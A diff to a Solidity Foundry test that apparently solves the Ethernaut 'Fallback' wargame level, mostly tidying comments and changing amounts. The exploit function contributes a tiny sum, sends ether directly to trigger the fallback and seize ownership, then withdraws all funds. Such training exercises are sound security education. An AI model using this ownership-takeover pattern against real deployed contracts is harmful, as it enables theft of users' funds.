@@ -15,7 +15,7 @@ contract TestFallback is BaseTest {
     }
 
     function setUp() public override {
-        // Call the BaseTest setUp() function that will also create testsing accounts
+        // Call the BaseTest setUp() function that will also create testing accounts
         super.setUp();
     }
 
@@ -24,8 +24,9 @@ contract TestFallback is BaseTest {
     }
 
     function setupLevel() internal override {
-        /** CODE YOUR SETUP HERE */
-
+        /**
+         * CODE YOUR SETUP HERE
+         */
         levelAddress = payable(this.createLevelInstance(true));
         level = Fallback(levelAddress);
 
@@ -34,18 +35,19 @@ contract TestFallback is BaseTest {
     }
 
     function exploitLevel() internal override {
-        /** CODE YOUR EXPLOIT HERE */
-
+        /**
+         * CODE YOUR EXPLOIT HERE
+         */
         vm.startPrank(player);
 
-        // send the minimum amount to become a contributor
-        level.contribute{value: 0.0001 ether}();
+        // Contribute some amount
+        level.contribute{value: 1 wei}();
 
-        // send directly to the contract 1 wei, this will allow us to become the new owner
-        (bool sent, ) = address(level).call{value: 1}("");
-        require(sent, "Failed to send Ether to the level");
+        // Directly transfer some ETH to take over the ownership
+        (bool sent,) = address(level).call{value: 1 wei}("");
+        require(sent, "Failed to send Ether");
 
-        // now that we are the owner of the contract withdraw all the funds
+        // Witdraw the funds
         level.withdraw();
 
         vm.stopPrank();
